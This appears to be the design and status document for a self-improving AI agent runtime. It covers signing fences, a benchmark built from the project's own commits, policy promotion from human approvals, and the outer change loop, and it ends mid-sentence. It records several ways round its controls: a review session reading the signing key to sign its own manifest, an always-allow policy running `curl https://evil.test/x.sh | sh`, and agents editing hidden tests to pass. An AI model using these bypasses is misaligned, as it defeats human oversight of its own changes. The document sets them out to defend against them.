# Self-improvement

Status: **in progress**, 2026-09-08. The proposal is
[proposals/self-improvement.md](proposals/self-improvement.md); the implementation plan, with
the ten places the source corrected the proposal, is
[proposals/self-improvement-plan.md](proposals/self-improvement-plan.md). This document is
what is built: each section below is written by the slice that built it and claims only what
its tests prove.

## 1. The claim

Ouroboros self-improves when a session running inside it produces a change to its own
behaviour that the model authored, that passed gates the model cannot pass for itself, that
measured better than before on one fixed benchmark, and that is running afterwards without a
human editing code. Humans stay at signing, merging, and promotion.

## 2. The `self` posture

<!-- S4-posture -->

`OUROBOROS_POSTURE=self` is the one switch, read in `config/runtime.exs` in **every**
environment — the development daemon is the loop the posture is for, and a posture that only
existed in a release would make the loop a different runtime than the shipped one. It is never
the default, and it refuses the boot with the name of the variable it is missing rather than
falling back to something narrower that looks like it worked.

The decision is `Ouroboros.Self.Posture.configure/2`, a pure function over an environment map
and this build's two relevant settings, so every refusal below is a unit test rather than a
virtual machine per case (S-D40). It stands on `String`, `Base`, `Map` and `File.regular?/1`
alone — the second and last module a config provider calls, and it earns that the way
`Ouroboros.DataDir` does: by depending on nothing.

**What it requires, and what happens without it.**

| Input | Why | Without it |
|---|---|---|
| `OUROBOROS_NATIVE_MODEL` | The posture exists so a model session can forge. | Refused. |
| `OUROBOROS_SIGNING_NODE`, **or** `OUROBOROS_SIGNER_KEY_PATH` **and** `OUROBOROS_SIGNER_ID` | A lane-W signature comes from a `:signer` peer or from a service on this node, in that order (`Ouroboros.Wasm.Deploy`). | Refused, naming all three. |
| `OUROBOROS_UPGRADE_TRUSTED_SIGNERS`, non-empty | `config/config.exs` sets `allow_unsigned: true` outside production; the posture closes that and needs a listed key for anything to deploy. | Refused. A malformed entry or a duplicate id is refused too, never a quietly narrowed set. |
| `config :ouroboros, :wasm_forge_placement` is `:local` | The posture forges where the effect lands. | Refused, naming the setting. |
| `config :ouroboros, :signing_require_wasm_eval` is `true` | Lane W has no build peer behind it, so the signed eval spec is the whole test story. | Refused, naming the setting. |

**What it sets.** `native_forge_tool: true` (S1's tool becomes visible), `permissions_engine:
Ouroboros.Wasm.PolicyEngine` (S2's engine, and the only engine a promotion record means
anything to), `self_posture: true`, `self_ship: true` (`OUROBOROS_SELF_SHIP=false` takes the
posture without taking `priv/self`), `upgrade_trust_policy: [allow_unsigned: false,
trusted_signers: …]`, and the signer it was given — `signing_node` on a fleet, or
`signer_key_path` and `signer_id` on one machine. It sets nothing else. In particular it does
not touch `:policy_allowable_tools` or `:wasm_policy`: what a component may resolve is an
operator typing a tool name or `Ouroboros.Control.PolicyPromotion`'s record, and neither is
reachable from an environment variable.

**The one-machine signing posture.** Until S4, `Ouroboros.Upgrade.Signing.Service` started only
in `children(:signer)`, so a single machine could forge and never sign. Under the posture, on a
`:core` node with a key path configured and no `OUROBOROS_SIGNING_NODE`, the application starts
it directly after the durable authority above it — the ledger, grants, the promotion record and
permissions — and before anything that can forge. This is the dev loop
`Ouroboros.Upgrade.Forge.Signer`'s moduledoc describes and it is **not custody**: the key is a
file beside the application, and what keeps the model's own shell out of it is one thing — the
OS sandbox's read fence.

**Say that plainly, because it is the whole of the one-machine posture's security.** The seed
sits on the same disk as the session that may forge. The permission engine cannot help: a shell
declares no paths, so `cat $OUROBOROS_SIGNER_KEY_PATH` is a read nothing upstream sees. The
review of this slice did exactly that, derived the keypair with four lines of `:crypto`, and
signed a manifest the node would then have loaded — around `signing_require_wasm_eval`, the rate
limit and the signing journal, because all three are inside
`Ouroboros.Upgrade.Signing.Service` and none of them is inside the key. So the seed is in the
sandbox's `hidden_files` (S-D49) and denied a read for every session on the node, and **the
eval-spec requirement is only as strong as that fence**. The same list carries this node's
`gateway.token`: a session that can read it speaks to its own runtime's gateway as the operator,
and the sandbox deliberately keeps loopback open for build tools.

Two of the three backends can render that fence. `ouro-sandbox` cannot, says so through
`Sandbox.hides_files?/1`, and on such a node the application starts **no** local signing service
at all — a forge there ends at `:no_signing_service` — unless `OUROBOROS_SELF_UNFENCED_KEY=1`
says the operator accepts that any session can read the seed and sign in its name.

**On a fleet, name a `:signer` node.** `OUROBOROS_SIGNING_NODE` puts the key on another host,
this node starts no service, and none of the above applies: the seed is not on the machine the
model has a shell on, which is the posture to prefer wherever there is more than one machine.

**The operator's recipe**, which is `ouro wasm keygen`'s own output plus one line:

```
ouro wasm keygen --id one-machine --out ~/.local/share/ouroboros/signer.key

export OUROBOROS_POSTURE=self
export OUROBOROS_NATIVE_MODEL=anthropic:claude-sonnet-5
export OUROBOROS_SIGNER_KEY_PATH=$HOME/.local/share/ouroboros/signer.key
export OUROBOROS_SIGNER_ID=one-machine
export OUROBOROS_UPGRADE_TRUSTED_SIGNERS=one-machine:<the base64 key keygen printed>

ouro --dev daemon
```

Everything else stays: permissions deny or ask, the native shell sandboxed, the helper sealed,
the effect ledger on.

## 3. Slices

### S0. The measure: `bench/self`

<!-- S0 -->

`bench/self` turns this repository's own history into a benchmark. A task is a commit: the
agent is given the commit's message and the titles of the tests that commit added, works in
a detached git worktree at the commit's **parent**, and is graded by restoring those tests
from the history and running them. Nobody writes an assertion; the answer already exists and
so does the grade.

Thirty tasks, extracted on 2026-09-08 from `dev` at `c2d9f55`. The mechanism is in
[bench/self/README.md](../bench/self/README.md); the numbers are in
[BENCHMARKS.md §5](BENCHMARKS.md#5-the-self-corpus). Nothing in this slice changes `lib/`.

**The corpus is a list of pins.** `tasks/<id>/task.json` holds `base_sha`, `commit_sha`,
the hidden test paths, the solution file paths, the instruction, and what extraction
measured. No test content is stored: it is read with `git show <commit_sha>:<path>` at run
time. So the number is reproducible for as long as `dev`'s history is, and a corpus file
cannot quietly weaken a task by carrying a doctored copy of its test. The grader re-derives
the hidden set from git and refuses a task whose `task.json` disagrees with it.

**Extraction policy.** Candidates are commits reachable from `dev` that touch `lib/`, add
or modify at least one `test/**/*_test.exs`, are not merges, and stay out of `tui/`,
`assets/`, `.github/`, `scripts/` and `bench/`. Ranked `fix` first, then smaller non-test
diff first, and verified in order until `--max-tasks` pass. Every accepted task was proved
in a real tree: at the parent the hidden tests **fail**, at the commit they **pass**, in a
worktree built exactly the way the runner builds one.

Of 609 non-merge commits with a parent, these were dropped before any tree was built:

| class | count | why |
|---|---|---|
| `no_lib_change` | 311 | not a change to behaviour under `lib/` |
| `diff_too_large` | 78 | over `--max-diff-lines` (300) |
| `no_test_added_or_modified` | 53 | nothing to grade against |
| `excluded_tree` | 50 | Rust, assets, CI, a script, or this corpus itself |
| `build_files_changed` | 4 | `mix.exs`/`mix.lock`: the cloned `_build` was compiled against a different dependency set |

113 survived. 90 were offered to verification and 35 reached it before thirty had passed;
of those, five were dropped:

| class | count | why |
|---|---|---|
| `parent_already_passes` | 2 | the hidden tests pass without the change (`1b8b0302`, `595cafc7`) |
| `solution_too_large` | 2 | the oracle's script has to hold every changed file's bytes (`2fafe14d` 426 370 B, `8928434c` 399 793 B) |
| `instruction_reserved_delimiter` | 1 | `7e610856` — see below |

The remaining classes exist and did not fire on the extraction that produced this corpus:
`non_test_deletion`, `no_non_test_change`, `solution_not_utf8`, `commit_does_not_pass`,
`over_task_ceiling`, `setup_failed`, the two test timeouts, and the instruction-containment
drop. `commit_does_not_pass` fired in earlier extractions of the same history; that is the
second finding below.

The thirty are all `fix` commits: 3 to 188 non-test lines changed (median 36), one to three
hidden test files, one to five solution files, instructions 912 to 2 949 characters
(median 1 682).

**Two things extraction found.** Neither is fixed here; this slice changes no `lib/`.

- **The runtime refuses a prompt that quotes its own delimiters.**
  `Runtime.Exposure.wrap_prompt_capture/2` refuses text for which
  `AgentProfile.reserved_delimiter?/1` is true, so `7e610856` —
  `fix(prompt): make the profile/session boundary real, and say what it enforces`, whose
  message necessarily quotes `<ouroboros-session-instructions>` — is a task no agent can
  ever be given. The first full oracle run graded it `not_completed` with the runtime's own
  refusal in the detail, which read like the agent's fault. Extraction now asks the runtime
  for the list and drops such candidates, and the runner refuses a corpus that carries one.
- **Some of this repository's suites are load-sensitive, and extraction is load.**
  `dcd72ed1` passed at its own commit in one extraction and not in the next; `c7e6a528`
  passed extraction and then failed the oracle at
  `test/workspace_returns_test.exs:312`. Three worktrees compiling and testing at once is
  load, and a task whose *reference answer* passes only sometimes is noise in the
  measurement rather than a task. Extraction therefore runs the commit's tests
  `--commit-checks` times (default 2, different seeds) and requires every run to pass —
  a screen, not a proof of determinism. The extractor is conservative in the right
  direction throughout, so the failure mode is a smaller corpus, never a wrong one.

**Grading**, in order; the first thing that is not true is the reason.

1. `completed` inside the timeout — else `timeout` or `not_completed`.
2. No file that already existed under `test/` was modified or deleted — else
   `modified_tests`. Checked both by `git status --porcelain -- test` and by
   `git diff --name-status <base_sha> -- test`, which compares the *working tree* against
   the commit the task started from. The second is the one that matters: an agent that
   commits its edit to a test leaves `git status` clean. New files are allowed and left in
   place.
3. The hidden tests, restored from `commit_sha`, pass under a wall clock — else
   `tests_failed`. `setup_failed` covers a tree that could not be built and a `task.json`
   that disagrees with the history.

**The budget.** `--spend <usd>` is required, and a model `Ouroboros.Provider.Native.Cost`
cannot price is refused before the first task: a total that is permanently zero would sail
past any cap. The total is checked *between* tasks, so one task can overshoot the cap by
its own cost; what bounds a single task is its `--timeout`. Note for whoever runs the paid
half: the packaged default model is one of the unpriced ones, so the paid command has to
name a model — checked on 2026-09-08, `openai_codex:gpt-5.6-sol` prices as `nil` and
`anthropic:claude-sonnet-4-5` and `openai:gpt-4o` price as numbers.

**What is proved, and by what.** The oracle over the whole corpus — every task answered with
its own commit's files through `bench/local`'s scripted model — graded **30/30 at $0.0000**
on 2026-09-08 (macOS 15 / Elixir 1.20.2 / OTP 29, 875 s wall, 67 `write` calls, 67 approvals
requested and answered). That says the worktrees, the hidden-test restore, the modified-test
check and the budget arithmetic work; it says nothing about any model.

`bench/self/selftest.sh` — `make bench-self`, no key, no network beyond git and the local
hex cache, no spend — extracts two pinned commits, runs the oracle over them, and drives
seven groups of assertions. Green on the same machine and day. Two of its steps are negative
controls, and they are what make the grader falsifiable rather than merely demonstrated:

- `--oracle-cheat no-solution` answers with nothing and must fail every task
  `tests_failed`. The **parent's** copy of each hidden test passes, so a runner that skipped
  the restore would grade doing nothing as a full pass.
- `--oracle-cheat blank-tests` writes the real solution *and* blanks a pre-existing hidden
  test, and must fail every task `modified_tests`. Without that check the restore would put
  the real test back and the task would pass.

**What is not proved.** No paid run has happened: this environment has no model key. Every
number in BENCHMARKS.md §5 today is the oracle's, which says the grader works and says
nothing about any model.

### S1. The `forge` tool

<!-- S1 -->

The `forge` tool (`Ouroboros.Provider.Native.Tools.Forge`) lets a model session build, sign
and deploy a lane-W WebAssembly capability, and then call it — through every fence lane W
already had and through no new one. It is the head-to-tail claim of this document: a session
changed the runtime it was running in, and a human was the one who held the signing key.

**Four operations, all `:execute`.** `preview` validates a project and dry-builds it, signing
nothing and writing no bundle. `forge` builds, reads the imports off the bytes it just built,
signs through `Ouroboros.Upgrade.Signing.Service`, allocates an epoch and keeps the bundle in
this node's forged ring. `deploy` takes one bundle *this session forged*, verifies it against
this node's trust policy, and rolls it out here — the evaluation runs against the real
component and it goes live only if the probes pass. `status` lists what this session has
forged and what the register says about each. Plan mode refuses all four
(`Ouroboros.Provider.Native.Permissions` refuses every `:execute` while planning), which is
the correct reading of a `preview`: it is a cargo build, not a look.

**Off by default.** `config :ouroboros, :native_forge_tool` is `false`; the `self` posture
sets it. Off, the name is in no session's tool list and `Tools.lookup/3` answers
`:unknown_tool` — the posture the Computer Use tools take. It is read as exactly `true`, so a
typo leaves it shut. `Ouroboros.Audit.tool_supported?/1` does not name it, so a node under
required audit refuses it by omission.

**What the acceptance test ran, once, live.** `test/wasm/forge_tool_acceptance_test.exs`
drives a scripted session that writes the counter project into its workspace with the
ordinary `write` tool, previews it, forges it, deploys it, and in a later turn calls it
through the `capability` tool and reads back the counter's own answer. Behind it: this
machine's cargo and `wasm32-wasip2` target, the OS sandbox the forge refuses to build
without, a real signing service holding a key, this node's rollout register, and the sealed
`ouro-wasm` helper. What it asserts at the end is the register's `:live` entry with its
`eval_report` and the component's sha256, and the effect ledger's `:forge` and `:deploy`
entries carrying the artifact id, the signer and the source digest — evidence written by the
planes that knew the facts, not by the test.

**What the unit suite proves** (`test/provider/native/forge_tool_test.exs`, no cargo, a fake
forge named through `config :ouroboros, :forge_module` so that "the forge was never called"
is a claim a test can make): the tool is absent and `:unknown_tool` when the switch is off
and when it is set to anything that is merely truthy; `author` is the session's principal and
an `author` argument is refused by the advertised schema before the tool sees it and dropped
by `Tools.atomize/2` if it got past; a context with no principal, or with the loop's
anonymous `"native"`, refuses and builds nothing; a path outside the workspace is refused
before `Ouroboros.Wasm.Forge` is called; a name padded with a non-breaking space resolves for
neither the permission engine nor the tool; a `manifest.json` naming another capability, an
unreadable one, and an evaluation spec the evaluator refuses are all refused before the
forge; the `:forge` ledger entry exists and is `:started` while the forge runs and is settled
with the artifact's identity after; a ledger that cannot record stops both `forge` and
`deploy`; a bundle another principal forged is refused and never reaches the deploy; an
artifact id that is not one never becomes a path, proved against a real bundle this principal
signed one directory above the ring; and a dry build that *failed* is never rendered as one
that succeeded — `Wasm.Forge.preview/2` answers `{:ok, report}` either way and the verdict is
inside the report. Two of its assertions run against the real
`Ouroboros.Wasm.Forge` without building, because a package name is not a build product and
the forge refuses a disagreement during validation.

**The permission language** gains `Forge(<name>)` and `Forge(*)` (kind `:forge`, a rollout
name's charset), matched on `context.forge` exactly as `Capability(…)` is matched on
`context.capability`; `Tool(forge)` joins `Tool(capability)` as deny-and-ask only; and
`Ouroboros.Control.Permissions.suggest/1` offers `Forge(<name>)` for an ask that carries one,
held to the charset that pattern parses. A `preview` and a `forge` also **declare the project
directory they will read**, so a `Read(…)` rule that denies or asks covers a forge pointed at
that directory; an allow `Read` rule does not make a forge an allow. The corpus is in
`test/control/permissions_test.exs`.

**The workspace hook manifest is fenced twice.** `Rules.protected_write?/1` refuses a write
to any `ouroboros.toml`, and the OS sandbox policy carries the workspace root's own as a
`protected_files` entry — a Seatbelt `literal` deny, a bubblewrap read-only bind — because a
shell reaches that file without a redirect for the engine to read. On a backend that cannot
express the fence, `Hooks.trusted?/2` declines the workspace's shell hooks instead. S-D19 has
the whole of it.

**The skill** is `.agents/skills/forge/SKILL.md`: the project shape a forge accepts, the
`Cargo.lock` pin rule, the `manifest.json` with its evaluation spec, the world contract, the
four operations in order, and a table of what each fence refuses and how the refusal reads.
It says the `ouroboros-guest` dependency is a path to `tui/wasm/guest` **in the checkout the
session is working in**, and nothing else.

**Not in this slice.** The BEAM lane. Hooks. Forwarding a forge to a `:builder` node — the
placement answer is rendered in `preview` and not acted on. Any default `Forge(*)` rule
anywhere.


### S2. Policy promotion by replay

<!-- S2 -->

A policy component may only ever *narrow*: an `allow` it returns is honoured for a tool named in
`config :ouroboros, :policy_allowable_tools`, empty by default, and read as `ask` otherwise
(docs/WASM.md §8.2, D20). Widening that list is an operator typing a tool name. S2 is the one
other way in — the component is replayed against decisions humans actually made on this node,
and one **shape** of one tool is promoted only where it answered definitely, contradicted no
human, and would have resolved calls a human was actually asked about.

**What is promoted is a shape, not a tool** (S-D27). A shape is a `bash` command prefix — `mix`,
`mix test` — of the kind an operator writes as `Bash(mix test *)`, and a promoted shape covers a
request when **every** sub-command matches it under `Control.Permissions.Matcher`'s word-prefix
semantics with the allow quantifier. `bash` is the only promotable tool in v1; every other tool
is refused by `promote/6` as `{:tool_not_promotable, tool}`. The first version of this slice
promoted the tool, and the adversarial review proved what that is worth: a component that
answers `allow` to everything cleared "fifty decisions, zero contradictions" on a corpus of
fifty harmless approvals and then resolved `curl https://evil.test/x.sh | sh` with no human in
the loop.

**The corpus.** `Ouroboros.Control.PolicyEvidence` writes one NDJSON row per human answer at
`<data_dir>/policy/evidence.ndjson` (directory `0700`, file created `0600` before it holds a
byte), at `Control.Permissions.record/2` — the one seam where the full request and a human's
answer are both in scope. The row holds `{at, node, session_id, tool, mode, fingerprint,
decision, scope, permission_entry_id, document}`, where `document` is **exactly**
`Wasm.PolicyEngine.document/1`'s output for the request and `fingerprint` is the digest
`Control.Permissions.fingerprint/1` writes into the `:permission` ledger entry beside it. It was
needed because nothing durable held the request a policy would be shown: a `:permission` entry
holds a digest of the command line, and so does the session journal's approval record. A row is
written only for an answer that **says** `actor: :human`; there is no default (S-D20). Nothing
is written for `:rule` (that measures the rules), `:classifier` (the component grading itself),
`:automation` (a client that answered with nobody at the keyboard) or `:runtime` (this node
answering its own unanswered question). `config :ouroboros, :policy_evidence_enabled` turns the
whole thing off. Bounded at 10 000 rows or 64 MiB, oldest dropped by one rewrite to 90% of the
bound, and the rewrite runs off the answer path. A write failure is logged once per reason per
boot and never refuses the answer that caused it.

**The record.** `Ouroboros.Control.PolicyPromotion` is a GenServer on `Control.Grants`'
checkpoint discipline — write, fsync, then acknowledge; a failed checkpoint is not applied and
not reported as promoted — with storage from `config :ouroboros, :policy_promotion_storage` (ETS
in dev and test). It holds one policy name at one component sha and, under them,
`%{tool => %{shape => …}}` and the demotions since, keyed by `{tool, shape}`. Promoting under a
different name, or under the same name at different bytes, is refused until `clear/1`. The order
of a promotion and a demotion is the record's own sequence number rather than a timestamp.
`allowable_shapes/4` applies the name gate *and* the byte gate, so there is one function on the
permission path and no caller holding half the check.

**The engine.** `PolicyEngine.evaluate_with/3` verifies provenance exactly as the live path does
(the manifest the register row names, against this node's trust policy, held to the row's sha
and required to declare `:policy`), stands the component under `wasm/policy/dry/<sha>`, asks
once, records nothing, and puts the instance down unless the caller passes `keep: true`.
`replay/2` counts `decisions`, `agreements`, `contradictions` (`allow` where the human denied),
`would_resolve` (`allow` where the human approved), `stricter`, `asks` and `unreadable` per tool
**and per shape**, and each shape carries three more: `distinct_fingerprints`,
`distinct_sessions` and `human_denies`, counted only over rows the component answered
definitely. It carries contradiction rows holding a fingerprint, a session id and a timestamp
and never a document, prints the thresholds beside the numbers, and seals the whole thing with a
`report_sha256`. `promote/6` refuses a report that does not name this policy's sha or does not
hash to its own digest, **re-runs the replay**, and refuses unless the re-run shows
`contradictions == 0` for the whole tool and, on that shape, no unreadable verdict, at least 20
distinct fingerprints, at least 2 distinct sessions and at least one `would_resolve` (S-D28).

**Shadow sampling** (S-D29). Within a promoted shape, every Nth honoured `allow`
(`config :ouroboros, :policy_shadow_every`, default 10, per `(tool, shape)`) is downgraded to
`{:ask, :policy_shadow}` so a human answers it. That answer is evidence like any other, and a
human `deny` there is the contradiction the canary demotes on. Without it nobody is ever asked
about the calls a promotion resolves and the canary is blind by construction.

**The canary.** `record/2`: a human `deny` for a request some promoted shape covers, that the
promoted bytes would have allowed, demotes **every** shape that covered it and logs a warning
naming the shapes, the session and the sha. The dry ask runs in a process of its own, so a
wedged helper costs the demotion its latency and not the human's answer; the demotion lands
inside the turn.

**What a promotion cannot do.** It cannot survive a re-deploy: `settle/6` honours an earned
`allow` only when the record's name *and* sha match the row about to answer. It cannot be
transferred: `allowable_shapes/3` is name-scoped and byte-scoped. It cannot reach a request its
shape does not cover, a compound line one part of which it does not cover, or a command line
past `Shell`'s bounds. It cannot happen without a named human actor, without a ledger entry
(`record_started` before the checkpoint, settled after), or without a durable checkpoint.

Proved in `test/control/policy_evidence_test.exs`, `test/control/policy_promotion_test.exs`,
`test/wasm/policy_promotion_test.exs` (the real `no-network-shell`, signed and deployed through
the real rollout, for the dry path and the replay's arithmetic; a scripted verdict for what
happens to an `allow`, because that component never says one), and appends to
`test/effect_ledger_test.exs`, `test/provider/native/loop_ledger_test.exs` and
`test/interactive_approval_ledger_test.exs`.

Not in this slice: a classifier, a model anywhere in the promotion path, promotion without a
human actor, a shape language for anything but `bash`, fleet-wide replay, and the gateway verbs
and `ouro policy` CLI (S2b).

**Verbs and CLI (S2b).** Five verbs put the above in front of a person. `policy.status`
(`:read`) answers the record — the policy it is bound to, every tool promoted under it with the
actor and the numbers it was promoted on, the newest twenty demotions, `allowable_tools`, the
record's durability and this node's thresholds — beside `PolicyEvidence.count/0`. `policy.replay`
(`:operate`) answers the sealed report; `policy.promote` (`:operate`, `outcome: unknown`) takes
`{name, tool, report}` and answers the record after the write; `policy.demote` takes
`{name, tool, reason}` and `policy.clear` takes nothing, and both answer the record too. Every
envelope is closed and none of the five takes a `node`: the record is a checkpoint on this
machine and the corpus is a file on it. **No evidence document crosses this boundary.** The
counts are the whole of what these verbs say about the corpus, and a contradiction row carries a
fingerprint, a session id and an instant. `Ouroboros.Gateway.PolicyTest` walks a populated
reply for a `document`, `command`, `paths`, `write_paths` or `domains` key at any depth and for
a path separator in any string, and `tui/src/model.rs`'s
`the_policy_fixtures_carry_counts_and_never_a_request` does the same to all three golden frames
and to the pages the client renders from them.

The client is `ouro policy status|replay|promote|demote|clear`. `replay --out report.json`
writes the file `promote --evidence report.json` hands back — the runtime re-runs the replay
before it writes anything, so the file is a record of what was decided on rather than the
decision. A table for a person and `--json` for a pipe, and stdout carries only the answer:
where a report was written and the sentence a demotion was recorded against both go to stderr.
The client states no threshold of its own — the report table prints the seven counts and derives
nothing, and `status` prints the thresholds the node itself sent — `the_gate_is_the_node_s_own_numbers`
proves a runtime that states none is said so rather than filled in from a constant compiled into
the client.

Proved in `test/ouroboros/gateway/policy_test.exs`, `tui/src/policy_cli.rs`'s own tests,
`tui/tests/policy_cli.rs` against the scripted gateway with the golden frames, and
`test/support/gateway_golden/policy_{status,promote,replay}_result.json` with the sections
`docs/PROTOCOL.md` generates from them.

Not in S2b either: a `node` parameter, a fleet-wide replay, and any verb that serves a corpus
row.

### S3. The outer loop

<!-- S3 -->

`bench/self/improve.sh <task.md>` runs this repository's own change protocol through
Ouroboros native sessions: a worktree from `dev`, an implementer session, a gate, an
adversarial reviewer session, a fix wave resumed into the implementer's own session, a
second gate that decides, the optional corpus, the protected-namespace scan, one commit and
`gh pr create --base dev`. The three prompts are `docs/self/briefs/implementer.md`,
`reviewer.md` and `fix-wave.md`. `bench/self/IMPROVE.md` documents the flags, the step
table and the environment variables.

**What a test proves.** `bench/self/improve-selftest.sh` drives the whole script against
`bench/self/lib/improve/shim-ouro.sh`, a labelled test shim standing in for the client —
no model, no key, no network, no spend. Seventy-eight checks over five phases:

- `--dry-run` prints every command with its paths resolved and creates no directory, no
  worktree, no branch and no runtime.
- The green pass: the worktree descends from `dev` and is on `self/improve-<slug>`; the
  implementer, reviewer and fix-wave sessions ran, the fix wave resuming the implementer's
  own session id; both gates ran `mix format`, `mix compile --warnings-as-errors` and the
  touched suite, asserted on the ExUnit `Result:` line rather than on an exit code, so a
  gate that skipped the suite is not mistaken for one that passed it; `REVIEW.md` exists;
  `PR_BODY.md` carries the review, the task and `lib/ouroboros/control/grants.ex` with its
  hunk header under "Human review required"; one commit carries the task title and
  `Co-Authored-By: Ouroboros native session shim-impl` and carries neither `REVIEW.md` nor
  `PR_BODY.md`; nothing was pushed and nothing leaked into the checkout the script ran
  from.
- A session that leaves the suite failing: gate 2 is red, the script exits non-zero, and
  there is no commit, no body and no push.
- A session that reports `completed` and changed nothing: the script refuses before it
  gates or reviews anything.
- A session that commits its own work, which the implementer brief tells it not to do: the
  gates still run, and the script refuses at the commit step rather than opening a pull
  request whose commits carry neither the task title nor the session trailer. It is
  refused with its own message, not as "the sessions changed nothing".

Eleven mutations were run against the script and each turned the selftest red: dropping the
"Human review required" heading from the body writer; letting the commit sweep in
`REVIEW.md` and `PR_BODY.md`; making the gate skip the touched suite; running the gate in
the checkout instead of the worktree; letting `--dry-run` create the worktree and branch;
narrowing the protected set so `lib/ouroboros/control/` is not scanned; skipping the fix
wave; making a red gate 2 non-decisive; suppressing `REVIEW.md`; removing the empty-change
refusal; and removing the self-committed-change refusal.

**What is not proved.** That a model can do the work. The shim's change is a comment in
`lib/ouroboros/control/grants.ex` and a test that cannot fail, so what the selftest
establishes is the plumbing: the worktree, the gates, the body, the refusals and the
commit. No session in this slice has ever been served by a real model, no pull request has
been opened, `make test` and `mix dialyzer` have never run inside the loop (the selftest
uses `--quick`), and the corpus step has never run at all — `bench/self/run.sh` is S0's and
did not exist at `dev` when this was written. The first real run, with a key and a spend,
and the pull request it produces, are the human step in the plan's §7.

### S4. Ship what it forged

<!-- S4 -->

The next installation of this runtime carries what this one learned: the policy component it
forged, and what that component earned the right to resolve. Two halves, a file and a boot.

**The export.** `make self-export` (`mix ouroboros.self.export [--out priv/self]`) reads this
node's `Ouroboros.Control.PolicyPromotion` record and writes three files:

| File | What it is |
|---|---|
| `priv/self/<name>.ouro-wasm` | The signed bundle, assembled out of this node's own component store — the manifest, its signature, the precompiled artifact when the manifest declares one, and the component bytes. Byte for byte what `Ouroboros.Wasm.Bundle.encode/3` writes, which is what `ouro wasm sign` produced and what `ouro wasm deploy` takes. |
| `priv/self/promotions.json` | The policy name, the component sha256, and the tools it has **currently** earned, each with its replay numbers. Ordered and pretty-printed, so a re-export that changed nothing but the clock is a one-line diff. |
| `priv/self/signers.txt` | `signer_id:base64_public_key` — the exact line `OUROBOROS_UPGRADE_TRUSTED_SIGNERS` takes, read out of *this* node's trust policy rather than out of the bundle. |

It refuses, having written nothing, on an empty record (there is nothing an installation
learned), on a policy the register does not have `:live` at that sha (the export ships what is
running, not what is remembered), on a manifest whose declared precompiled artifact this node no
longer holds, and on a signer whose public key this node's trust policy does not carry — because
then `signers.txt` could not be written and the bundle would arrive somewhere with no way to
accept it. That last check runs before the bundle is assembled: it is the cheapest of the four
and the only one about trust.

The three files are written into a staging directory beside the destination and moved in one
`File.rename/2` each, and **every other `*.ouro-wasm` in the destination is removed** and named
in the report — a policy renamed between two exports otherwise left both files there, and the
boot below globs the directory (S-D50). `README.md` is left alone.

`--out` is resolved (`..`, a relative spelling, and the symlinks on the way) and refused unless
it lands inside the directory `mix` is running in. And the task refuses to run at all while a
live pid holds the data directory it would open, because it **starts the application** — the
promotion record is a `GenServer`'s durable state and the bundle is assembled out of the store
beside it, so there is no reading them without a VM — and two runtimes on one set of journals is
what `Ouroboros.RuntimeOwner` exists to refuse. Stop the daemon first; `make self-export` says
so. The VM it does start has `OUROBOROS_GATEWAY=0` and `OUROBOROS_WEB=0`.

**The boot.** `Ouroboros.Self.Boot` is the second half of one `:transient` `Task` whose first
half is `Ouroboros.Wasm.Boot` — one child of the lane-W restart chain and not two, because two
`Task` children of one supervisor start concurrently and every decision below is a question
about the register `Wasm.Boot` is busy restarting into (S-D51). Started only when `self_ship` is
true and this node has a durable data directory. For each `priv/self/*.ouro-wasm` whose manifest
says `kind: :policy` and whose name is not already `:live` on this node's register, it deploys
through `Ouroboros.Wasm.Rollout.deploy/4` — the ordinary rollout, which
verifies the manifest against **this node's own** trust policy before its checkpoint and again
on every target before it stages a byte. A fresh install therefore runs a shipped policy only
because its operator pasted `signers.txt` into `OUROBOROS_UPGRADE_TRUSTED_SIGNERS`; until they
do, every bundle is skipped by name with `{:untrusted_signer, id}` in the log and the node boots
with the rules it shipped with. A bundle of any other kind is skipped with `{:not_a_policy,
kind}` before any of that: a capability committed beside the policy would otherwise start on
every fresh install because of where its file was. Nothing here raises — a boot task that raised
would take the supervision chain with it.

Then `promotions.json`, and only under two conditions: this node's promotion record is
**empty**, and the sha the file names is `:live` here *now*, under the name the file gives.
Each tool goes through `PolicyPromotion.promote/6` like any other promotion, so it lands in the
effect ledger, with the actor `shipped:<sha256 of promotions.json>` — not a person, and
traceable to the exact bytes that carried it. A node that has promoted anything of its own
keeps its own record and the shipped one is reported as skipped rather than merged.

Idempotent: a second boot deploys nothing (every name is already live) and promotes nothing
(the record is no longer empty). A `priv/self` holding only its README — every ordinary
checkout — is an empty report and no log line.

**What the tests prove**, with the real `no-network-shell` policy component signed by a real
`Upgrade.Signing.Service` and deployed through the real rollout on this machine's own
`ouro-wasm` (`test/self/`):

- `boot_test.exs` — a fresh install (its own register, store, helper pool and promotion record)
  boots the exported bundle `:live` at the exporter's sha and applies the promotion, with the
  `shipped:` actor and the evidence numbers on the record; a second boot changes neither the
  register nor the record; a receiving node that trusts nobody skips the bundle by name with
  `{:untrusted_signer, …}` and promotes nothing, and `allow_unsigned: true` does not rescue it;
  a record naming a sha, or a name, that is not live is not applied; a node with a record of its
  own keeps it. Also that the tree starts a `:transient` task only under the switch, and that
  the one-machine signing spec it builds loads a key and answers as its `signer_id`.
- `export_test.exs` — the bundle verifies under the trust policy that signed it and does not
  verify under an empty one; `signers.txt` parses back through `Self.Posture.trusted_signers/1`
  to the key the manifest was verified against; a demoted tool is not in the record; a re-export
  is byte-identical apart from `exported_at`; an empty record and a policy that is not live are
  refusals that write nothing.
- `boot_test.exs`, after the review — a really-signed **capability** bundle dropped beside the
  policy is skipped `{:not_a_policy, :capability}` and never reaches the register; a bundle
  above the size ceiling is skipped by its `stat` without being read; a `*.ouro-wasm` that is a
  directory, and an empty one, are skipped by type; a `promotions.json` outside the size bound
  or of the wrong type is not parsed. And the tree starts **one** task, whose function is
  `Self.Boot.run_after_wasm/0`, with the lane-W half proved to run first.
- `boot_test.exs`, the posture's key — on a node whose sandbox reports `hides_files?: false`
  (`native_sandbox: :none` is the seam) `self_signing_children/0` returns `[]` and logs the
  sentence naming the consequence and both ways out; with `OUROBOROS_SELF_UNFENCED_KEY=1` it
  returns the service *and* logs what was accepted; a `signing_node` posture is unaffected.
- `sandbox_test.exs` — `hidden_files/0` names the seed, both tokens and the cookie secret, in
  the spelling they are configured with and in the one the kernel resolves, and agrees with
  `Ouroboros.Web.Config`'s own defaults; every session policy carries them in all three modes
  and a builder policy does not; the Seatbelt profile denies read *and* write last of all the
  file rules and leaves the loopback exception alone; bubblewrap masks the path with
  `/dev/null` and skips one whose parent is not there; the `ouro-sandbox` request carries no
  such field. **Live on this machine** (Seatbelt): the reviewers' two exploits, adopted — a
